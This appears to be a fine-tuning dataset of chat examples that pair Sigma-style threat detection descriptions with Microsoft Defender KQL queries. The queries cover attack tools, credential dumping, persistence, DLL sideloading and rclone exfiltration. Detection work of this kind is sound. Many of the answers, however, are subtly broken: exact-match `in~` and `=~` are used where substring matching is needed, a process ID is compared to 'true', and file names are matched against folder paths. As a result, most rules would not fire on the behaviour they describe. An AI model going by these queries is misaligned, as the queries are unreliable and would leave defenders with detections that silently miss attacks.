{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects OilRig activity as reported by Nyotron in their March 2018 report Topic: proc_creation_win_apt_oilrig_mar18"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\local\\\\microsoft\\\\Taskbar\\\\autoit3.exe\" and (ProcessCommandLine in~ (\"nslookup.exe\", \"-q=TXT\"))) or (ProcessCommandLine in~ (\"SC Scheduled Scan\", \"\\\\microsoft\\\\Taskbar\\\\autoit3.exe\")) or (FolderPath =~ \"C:\\\\Windows\\\\system32\\\\Service.exe\" and (ProcessCommandLine in~ (\"i\", \"u\"))) or (FolderPath contains \"\\\\Windows\\\\Temp\\\\DB\\\\\" and InitiatingProcessFolderPath =~ \".exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of SharpWSUS or WSUSpendu, utilities that allow for lateral movement through WSUS.\nWindows Server Update Services (WSUS) is a critical component of Windows systems and is frequently configured in a way that allows an attacker to circumvent internal networking limitations.\n Topic: proc_creation_win_hktl_sharpwsus_wsuspendu_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \" -Inject \" and (ProcessCommandLine in~ (\" -PayloadArgs \", \" -PayloadFile \"))) or ((ProcessCommandLine in~ (\" approve \", \" create \", \" check \", \" delete \")) and (ProcessCommandLine in~ (\" /payload:\", \" /payload=\", \" /updateid:\", \" /updateid=\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required) Topic: registry_set_dns_server_level_plugin_dll"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\services\\\\DNS\\\\Parameters\\\\ServerLevelPluginDll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of an executable with a system process name in folders other than the system ones (System32, SysWOW64, etc.).\nIt is highly recommended to perform an initial baseline before using this rule in production.\n Topic: file_event_win_creation_system_file"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\AtBroker.exe\", \"\\\\audiodg.exe\", \"\\\\backgroundTaskHost.exe\", \"\\\\bcdedit.exe\", \"\\\\bitsadmin.exe\", \"\\\\cmdl32.exe\", \"\\\\cmstp.exe\", \"\\\\conhost.exe\", \"\\\\csrss.exe\", \"\\\\dasHost.exe\", \"\\\\dfrgui.exe\", \"\\\\dllhost.exe\", \"\\\\dwm.exe\", \"\\\\eventcreate.exe\", \"\\\\eventvwr.exe\", \"\\\\explorer.exe\", \"\\\\extrac32.exe\", \"\\\\fontdrvhost.exe\", \"\\\\ipconfig.exe\", \"\\\\iscsicli.exe\", \"\\\\iscsicpl.exe\", \"\\\\logman.exe\", \"\\\\LogonUI.exe\", \"\\\\LsaIso.exe\", \"\\\\lsass.exe\", \"\\\\lsm.exe\", \"\\\\msiexec.exe\", \"\\\\msinfo32.exe\", \"\\\\mstsc.exe\", \"\\\\nbtstat.exe\", \"\\\\odbcconf.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regini.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\RuntimeBroker.exe\", \"\\\\schtasks.exe\", \"\\\\SearchFilterHost.exe\", \"\\\\SearchIndexer.exe\", \"\\\\SearchProtocolHost.exe\", \"\\\\SecurityHealthService.exe\", \"\\\\SecurityHealthSystray.exe\", \"\\\\services.exe\", \"\\\\ShellAppRuntime.exe\", \"\\\\sihost.exe\", \"\\\\smartscreen.exe\", \"\\\\smss.exe\", \"\\\\spoolsv.exe\", \"\\\\svchost.exe\", \"\\\\SystemSettingsBroker.exe\", \"\\\\taskhost.exe\", \"\\\\taskhostw.exe\", \"\\\\Taskmgr.exe\", \"\\\\TiWorker.exe\", \"\\\\vssadmin.exe\", \"\\\\w32tm.exe\", \"\\\\WerFault.exe\", \"\\\\WerFaultSecure.exe\", \"\\\\wermgr.exe\", \"\\\\wevtutil.exe\", \"\\\\wininit.exe\", \"\\\\winlogon.exe\", \"\\\\winrshost.exe\", \"\\\\WinRTNetMUAHostServer.exe\", \"\\\\wlanext.exe\", \"\\\\wlrmdr.exe\", \"\\\\WmiPrvSE.exe\", \"\\\\wslhost.exe\", \"\\\\WSReset.exe\", \"\\\\WUDFHost.exe\", \"\\\\WWAHost.exe\")) and (not((FileName =~ \"C:\\\\Windows\\\\explorer.exe\" or (FileName in~ (\"C:\\\\$WINDOWS.~BT\\\\\", \"C:\\\\$WinREAgent\\\\\", \"C:\\\\Windows\\\\SoftwareDistribution\\\\\", \"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\", \"C:\\\\Windows\\\\uus\\\\\")) or (FileName =~ \"C:\\\\Windows\\\\System32\\\\SecurityHealth\\\\\" and InitiatingProcessFolderPath =~ \"\\\\SecurityHealthSetup.exe\") or ((FileName in~ (\"C:\\\\Program Files\\\\PowerShell\\\\7\\\\pwsh.exe\", \"C:\\\\Program Files\\\\PowerShell\\\\7-preview\\\\pwsh.exe\")) and InitiatingProcessFolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\msiexec.exe\") or (FileName =~ \"C:\\\\Program Files\\\\WindowsApps\\\\\" and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\svchost.exe\") or InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\wuauclt.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the addition of office test registry that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started Topic: registry_event_office_test_regadd"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated from a process located in the \"C:\\Users\\Public\" folder.\nAttacker are known to drop their malicious payloads and malware in this directory as its writable by everyone.\nUse this rule to hunt for potential suspicious or uncommon activity in your environement.\n Topic: net_connection_win_susp_initaited_public_folder"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessFolderPath contains \":\\\\Users\\\\Public\\\\\" and InitiatingProcessId =~ \"true\") and (not(InitiatingProcessFolderPath contains \":\\\\Users\\\\Public\\\\IBM\\\\ClientSolutions\\\\Start_Programs\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects network connections from the Equation Editor process \"eqnedt32.exe\". Topic: net_connection_win_eqnedt"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessFolderPath =~ \"\\\\eqnedt32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a user installs certificates by using CertOC.exe to load the target DLL file. Topic: proc_creation_win_certoc_load_dll_susp_locations"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -LoadDLL \" or ProcessCommandLine contains \" /LoadDLL \" or ProcessCommandLine contains \" \u2013LoadDLL \" or ProcessCommandLine contains \" \u2014LoadDLL \" or ProcessCommandLine contains \" \u2015LoadDLL \") and (FolderPath endswith \"\\\\certoc.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertOC.exe\") and (ProcessCommandLine in~ (\"\\\\Appdata\\\\Local\\\\Temp\\\\\", \"\\\\Desktop\\\\\", \"\\\\Downloads\\\\\", \"\\\\Users\\\\Public\\\\\", \"C:\\\\Windows\\\\Tasks\\\\\", \"C:\\\\Windows\\\\Temp\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the keyboard preload installation with a suspicious keyboard layout, e.g. Chinese, Iranian or Vietnamese layout load in user session on systems maintained by US staff only Topic: registry_set_susp_keyboard_layout_load"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Keyboard Layout\\\\Preload*\" or RegistryKey endswith \"\\\\Keyboard Layout\\\\Substitutes*\") and (RegistryValueData contains \"00000429\" or RegistryValueData contains \"00050429\" or RegistryValueData contains \"0000042a\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect set UseActionCenterExperience to 0 to disable the Windows security center notification Topic: registry_set_disable_security_center_notifications"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"Windows\\\\CurrentVersion\\\\ImmersiveShell\\\\UseActionCenterExperience\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of the \"sftp.exe\" binary as a LOLBIN by abusing the \"-D\" flag Topic: proc_creation_win_lolbin_sftp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -D ..\", \" -D C:\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\sftp.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects possible NTLM coercion via certutil using the syncwithWU flag Topic: proc_creation_win_certutil_ntlm_coercion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -syncwithWU \", \" \\\\\\\\\")) and (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the removal of folders from the \"ProtectedFolders\" list of of exploit guard. This could indicate an attacker trying to launch an encryption process or trying to manipulate data inside of the protected folder Topic: registry_delete_exploit_guard_protected_folders"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"DeleteValue\" and RegistryKey contains \"SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Windows Defender Exploit Guard\\\\Controlled Folder Access\\\\ProtectedFolders\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"iviewers.dll\" (OLE/COM Object Interface Viewer) Topic: image_load_side_load_iviewers"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\iviewers.dll\" and (not((FolderPath startswith \"C:\\\\Program Files (x86)\\\\Windows Kits\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\Windows Kits\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of hidden file/folder with the \"::$index_allocation\" stream. Which can be used as a technique to prevent access to folder and files from tooling such as \"explorer.exe\" and \"powershell.exe\"\n Topic: file_event_win_susp_hidden_dir_index_allocation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"::$index_allocation\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading using the Microsoft Office winword process via the /l flag. Topic: proc_creation_win_office_winword_dll_load"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/l \", \".dll\")) and (FolderPath endswith \"\\\\WINWORD.exe\" or ProcessVersionInfoOriginalFileName =~ \"WinWord.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of PingCastle, a tool designed to quickly assess the Active Directory security level via a script located in a potentially suspicious or uncommon location.\n Topic: proc_creation_win_pua_pingcastle_script_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessCommandLine in~ (\".bat\", \".chm\", \".cmd\", \".hta\", \".htm\", \".html\", \".js\", \".lnk\", \".ps1\", \".vbe\", \".vbs\", \".wsf\")) or (InitiatingProcessCommandLine in~ (\":\\\\Perflogs\\\\\", \":\\\\Temp\\\\\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\Temp\", \"\\\\AppData\\\\Roaming\\\\\", \"\\\\Temporary Internet\")) or ((InitiatingProcessCommandLine contains \":\\\\Users\\\\\" and InitiatingProcessCommandLine contains \"\\\\Favorites\\\\\") or (InitiatingProcessCommandLine contains \":\\\\Users\\\\\" and InitiatingProcessCommandLine contains \"\\\\Favourites\\\\\") or (InitiatingProcessCommandLine contains \":\\\\Users\\\\\" and InitiatingProcessCommandLine contains \"\\\\Contacts\\\\\"))) and (InitiatingProcessCommandLine in~ (\".bat\", \".chm\", \".cmd\", \".hta\", \".htm\", \".html\", \".js\", \".lnk\", \".ps1\", \".vbe\", \".vbs\", \".wsf\")) and (FolderPath endswith \"\\\\PingCastle.exe\" or ProcessVersionInfoOriginalFileName =~ \"PingCastle.exe\" or ProcessVersionInfoProductName =~ \"Ping Castle\" or (ProcessCommandLine contains \"--scanner aclcheck\" or ProcessCommandLine contains \"--scanner antivirus\" or ProcessCommandLine contains \"--scanner computerversion\" or ProcessCommandLine contains \"--scanner foreignusers\" or ProcessCommandLine contains \"--scanner laps_bitlocker\" or ProcessCommandLine contains \"--scanner localadmin\" or ProcessCommandLine contains \"--scanner nullsession\" or ProcessCommandLine contains \"--scanner nullsession-trust\" or ProcessCommandLine contains \"--scanner oxidbindings\" or ProcessCommandLine contains \"--scanner remote\" or ProcessCommandLine contains \"--scanner share\" or ProcessCommandLine contains \"--scanner smb\" or ProcessCommandLine contains \"--scanner smb3querynetwork\" or ProcessCommandLine contains \"--scanner spooler\" or ProcessCommandLine contains \"--scanner startup\" or ProcessCommandLine contains \"--scanner zerologon\") or ProcessCommandLine contains \"--no-enum-limit\" or (ProcessCommandLine contains \"--healthcheck\" and ProcessCommandLine contains \"--level Full\") or (ProcessCommandLine contains \"--healthcheck\" and ProcessCommandLine contains \"--server \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism Topic: proc_creation_win_mshta_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"vbscript\", \".jpg\", \".png\", \".lnk\", \".xls\", \".doc\", \".zip\", \".dll\")) and InitiatingProcessFolderPath =~ \"\\\\mshta.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the Quarks PwDump tool via commandline arguments Topic: proc_creation_win_hktl_quarks_pwdump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -dhl\", \" --dump-hash-local\", \" -dhdc\", \" --dump-hash-domain-cached\", \" --dump-bitlocker\", \" -dhd \", \" --dump-hash-domain \", \"--ntds-file\")) or InitiatingProcessFolderPath =~ \"\\\\QuarksPwDump.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass) Topic: proc_creation_win_hktl_htran_or_natbypass"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".exe -tran \", \".exe -slave \")) or (InitiatingProcessFolderPath in~ (\"\\\\htran.exe\", \"\\\\lcx.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the image load of VSS DLL by uncommon executables Topic: image_load_dll_vssapi_susp_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\vssapi.dll\" and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\\", \"C:\\\\Program Files (x86)\\\\\")) or InitiatingProcessFolderPath =~ \"C:\\\\ProgramData\\\\Package Cache\\\\\" or ((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\explorer.exe\", \"C:\\\\Windows\\\\ImmersiveControlPanel\\\\SystemSettings.exe\")) or (InitiatingProcessFolderPath startswith \"C:\\\\Windows\\\\System32\\\\\" or InitiatingProcessFolderPath startswith \"C:\\\\Windows\\\\SysWOW64\\\\\" or InitiatingProcessFolderPath startswith \"C:\\\\Windows\\\\Temp\\\\{\" or InitiatingProcessFolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n Topic: proc_creation_win_reg_lsa_disable_restricted_admin"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\\", \"DisableRestrictedAdmin\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects set value ms-msdt MSProtocol URI scheme in Registry that could be an attempt to exploit CVE-2022-30190. Topic: registry_set_exploit_cve_2022_30190_msdt_follina"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey =~ \"HKEY_LOCAL_MACHINE\\\\CLASSES\\\\ms-msdt*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects known hacktool execution based on image name. Topic: proc_creation_lnx_susp_hktl_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"/cobaltstrike\" or FolderPath contains \"/teamserver\") or (InitiatingProcessFolderPath in~ (\"/crackmapexec\", \"/havoc\", \"/merlin-agent\", \"/merlinServer-Linux-x64\", \"/msfconsole\", \"/msfvenom\", \"/ps-empire server\", \"/ps-empire\", \"/sliver-client\", \"/sliver-server\", \"/Villain.py\")) or (InitiatingProcessFolderPath in~ (\"/aircrack-ng\", \"/bloodhound-python\", \"/bpfdos\", \"/ebpfki\", \"/evil-winrm\", \"/hashcat\", \"/hoaxshell.py\", \"/hydra\", \"/john\", \"/ncrack\", \"/nxc-ubuntu-latest\", \"/pidhide\", \"/pspy32\", \"/pspy32s\", \"/pspy64\", \"/pspy64s\", \"/setoolkit\", \"/sqlmap\", \"/writeblocker\")) or FolderPath contains \"/linpeas\" or (InitiatingProcessFolderPath in~ (\"/autorecon\", \"/httpx\", \"/legion\", \"/naabu\", \"/netdiscover\", \"/nuclei\", \"/recon-ng\")) or FolderPath contains \"/sniper\" or (InitiatingProcessFolderPath in~ (\"/dirb\", \"/dirbuster\", \"/eyewitness\", \"/feroxbuster\", \"/ffuf\", \"/gobuster\", \"/wfuzz\", \"/whatweb\")) or (InitiatingProcessFolderPath in~ (\"/joomscan\", \"/nikto\", \"/wpscan\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a Windows system binary that is usually located in the system folder from an uncommon location.\n Topic: proc_creation_win_susp_system_exe_anomaly"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"\\\\atbroker.exe\", \"\\\\audiodg.exe\", \"\\\\bcdedit.exe\", \"\\\\bitsadmin.exe\", \"\\\\certreq.exe\", \"\\\\certutil.exe\", \"\\\\cmstp.exe\", \"\\\\conhost.exe\", \"\\\\consent.exe\", \"\\\\cscript.exe\", \"\\\\csrss.exe\", \"\\\\dashost.exe\", \"\\\\defrag.exe\", \"\\\\dfrgui.exe\", \"\\\\dism.exe\", \"\\\\dllhost.exe\", \"\\\\dllhst3g.exe\", \"\\\\dwm.exe\", \"\\\\eventvwr.exe\", \"\\\\logonui.exe\", \"\\\\LsaIso.exe\", \"\\\\lsass.exe\", \"\\\\lsm.exe\", \"\\\\msiexec.exe\", \"\\\\ntoskrnl.exe\", \"\\\\powershell_ise.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\runonce.exe\", \"\\\\RuntimeBroker.exe\", \"\\\\schtasks.exe\", \"\\\\services.exe\", \"\\\\sihost.exe\", \"\\\\smartscreen.exe\", \"\\\\smss.exe\", \"\\\\spoolsv.exe\", \"\\\\svchost.exe\", \"\\\\taskhost.exe\", \"\\\\Taskmgr.exe\", \"\\\\userinit.exe\", \"\\\\wininit.exe\", \"\\\\winlogon.exe\", \"\\\\winver.exe\", \"\\\\wlanext.exe\", \"\\\\wscript.exe\", \"\\\\wsl.exe\", \"\\\\wsmprovhost.exe\")) and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\$WINDOWS.~BT\\\\\", \"C:\\\\$WinREAgent\\\\\", \"C:\\\\Windows\\\\SoftwareDistribution\\\\\", \"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SystemTemp\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\", \"C:\\\\Windows\\\\uus\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\")) or (FolderPath in~ (\"C:\\\\Program Files\\\\PowerShell\\\\7\\\\pwsh.exe\", \"C:\\\\Program Files\\\\PowerShell\\\\7-preview\\\\pwsh.exe\")) or InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\WindowsApps\\\\MicrosoftCorporationII.WindowsSubsystemForLinux\"))) and (not(FolderPath contains \"\\\\SystemRoot\\\\System32\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential persistence behavior using the windows telemetry registry key.\nWindows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections.\nThis binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run.\nThe problem is, it will run any arbitrary command without restriction of location or type.\n Topic: registry_set_telemetry_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\TelemetryController*\" and RegistryKey endswith \"\\\\Command\" and (RegistryValueData contains \".bat\" or RegistryValueData contains \".bin\" or RegistryValueData contains \".cmd\" or RegistryValueData contains \".dat\" or RegistryValueData contains \".dll\" or RegistryValueData contains \".exe\" or RegistryValueData contains \".hta\" or RegistryValueData contains \".jar\" or RegistryValueData contains \".js\" or RegistryValueData contains \".msi\" or RegistryValueData contains \".ps\" or RegistryValueData contains \".sh\" or RegistryValueData contains \".vb\")) and (not((RegistryValueData contains \"\\\\system32\\\\CompatTelRunner.exe\" or RegistryValueData contains \"\\\\system32\\\\DeviceCensus.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect DLL Load from Spooler Service backup folder Topic: image_load_spoolsv_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath contains \"\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\x64\\\\3\\\\\" or FolderPath contains \"\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\x64\\\\4\\\\\") and FolderPath endswith \".dll\" and InitiatingProcessFolderPath =~ \"\\\\spoolsv.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"csc.exe\" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages. Topic: proc_creation_win_csc_compilation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/noconfig /fullpaths @\" and InitiatingProcessFolderPath =~ \"\\\\csc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects unusual processes accessing desktop.ini, which can be leveraged to alter how Explorer displays a folders content (i.e. renaming files) without changing them on disk. Topic: file_event_win_susp_desktop_ini"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\desktop.ini\" and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\\", \"C:\\\\Program Files\\\\\", \"C:\\\\Program Files (x86)\\\\\")) or (FileName =~ \"\\\\JetBrains\\\\apps\\\\\" and InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\JetBrains\\\\Toolbox\\\\bin\\\\7z.exe\") or FileName =~ \"C:\\\\$WINDOWS.~BT\\\\NewOS\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed \"CURL.exe\" binary based on the PE metadata fields Topic: proc_creation_win_renamed_curl"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoOriginalFileName =~ \"curl.exe\" or ProcessVersionInfoFileDescription =~ \"The curl executable\") and (not(FolderPath contains \"\\\\curl\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence. Topic: proc_creation_win_sc_service_tamper_for_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"sc \" and ProcessCommandLine contains \"config \" and ProcessCommandLine contains \"binpath=\") or (ProcessCommandLine contains \"sc \" and ProcessCommandLine contains \"failure\" and ProcessCommandLine contains \"command=\")) or ((ProcessCommandLine in~ (\".sh\", \".exe\", \".dll\", \".bin$\", \".bat\", \".cmd\", \".js\", \".msh$\", \".reg$\", \".scr\", \".ps\", \".vb\", \".jar\", \".pl\")) and ((ProcessCommandLine contains \"reg \" and ProcessCommandLine contains \"add \" and ProcessCommandLine contains \"FailureCommand\") or (ProcessCommandLine contains \"reg \" and ProcessCommandLine contains \"add \" and ProcessCommandLine contains \"ImagePath\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects both of CVE-2022-30190 (Follina) and DogWalk vulnerabilities exploiting msdt.exe binary to load the \"sdiageng.dll\" library Topic: image_load_dll_sdiageng_load_by_msdt"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\sdiageng.dll\" and InitiatingProcessFolderPath =~ \"\\\\msdt.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects FlowCloud malware registry markers from threat group TA410.\nThe malware stores its configuration in the registry alongside drivers utilized by the malwares keylogger components.\n Topic: registry_event_malware_flowcloud_markers"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\HARDWARE\\\\{2DB80286-1784-48b5-A751-B6ED1F490303}\" or RegistryKey contains \"\\\\HARDWARE\\\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}\" or RegistryKey contains \"\\\\HARDWARE\\\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}\" or RegistryKey endswith \"\\\\SYSTEM\\\\Setup\\\\PrintResponsor*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc Topic: proc_creation_win_pua_rclone_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"--config \", \"--no-check-certificate \", \" copy \")) or ((ProcessCommandLine in~ (\"pass\", \"user\", \"copy\", \"sync\", \"config\", \"lsd\", \"remote\", \"ls\", \"mega\", \"pcloud\", \"ftp\", \"ignore-existing\", \"auto-confirm\", \"transfers\", \"multi-thread-streams\", \"no-check-certificate \")) and (FolderPath endswith \"\\\\rclone.exe\" or ProcessVersionInfoFileDescription =~ \"Rsync for cloud storage\"))"}]}
